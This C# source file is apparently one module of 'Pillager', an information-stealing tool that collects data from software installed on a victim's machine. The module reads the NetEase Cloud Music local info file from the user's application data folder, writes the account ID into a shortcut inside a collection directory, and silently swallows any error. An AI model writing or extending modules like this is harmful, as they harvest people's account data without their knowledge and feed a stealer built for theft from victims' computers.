using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Pillager.Softwares
{
    internal class NeteaseCloudMusic
    {
        public static string SoftwareName = "NeteaseCloudMusic";

        public static void Save(string path)
        {
            try
            {
                string infopath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Netease\\CloudMusic\\info");
                string info = File.ReadAllText(infopath);
                if (string.IsNullOrEmpty(info)) return;
                string savepath = Path.Combine(path, SoftwareName);
                Directory.CreateDirectory(savepath);
                File.WriteAllText(Path.Combine(savepath, "userinfo.url"), " [InternetShortcut]\r\nURL=https://music.163.com/#/user/home?id=" + info);
            }
            catch { }
        }
    }
}
